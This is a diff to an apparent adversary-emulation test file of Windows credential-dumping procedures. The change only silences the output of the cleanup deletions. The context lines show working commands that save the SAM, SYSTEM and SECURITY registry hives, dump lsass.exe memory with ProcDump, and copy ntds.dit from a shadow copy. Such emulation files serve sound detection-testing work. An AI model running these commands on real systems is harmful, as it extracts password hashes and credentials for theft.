@@ -76,9 +76,9 @@ atomic_tests:
       reg save HKLM\system "#{output_folder}\system"
       reg save HKLM\security "#{output_folder}\security"
     cleanup_command: |
-      del "#{output_folder}\sam"
-      del "#{output_folder}\system"
-      del "#{output_folder}\security"
+      del "#{output_folder}\sam"       >nul 2> nul
+      del "#{output_folder}\system"    >nul 2> nul
+      del "#{output_folder}\security"  >nul 2> nul
 
 - name: Dump LSASS.exe Memory using ProcDump
   description: |
@@ -104,7 +104,7 @@ atomic_tests:
     command: |
       #{procdump_binary_path} -accepteula -ma lsass.exe #{output_file}
     cleanup_command: |
-      del "#{output_file}"
+      del "#{output_file}" >nul 2> nul
 
 - name: Dump LSASS.exe Memory using Windows Task Manager
   description: |
@@ -221,9 +221,9 @@ atomic_tests:
       copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
       reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
     cleanup_command: |
-      del "#{extract_path}\ntds.dit"
-      del "#{extract_path}\VSC_SYSTEM_HIVE"
-      del "#{extract_path}\SYSTEM_HIVE"
+      del "#{extract_path}\ntds.dit"        >nul 2> nul
+      del "#{extract_path}\VSC_SYSTEM_HIVE" >nul 2> nul
+      del "#{extract_path}\SYSTEM_HIVE"     >nul 2> nul
 
 - name: GPP Passwords (findstr)
   description: |
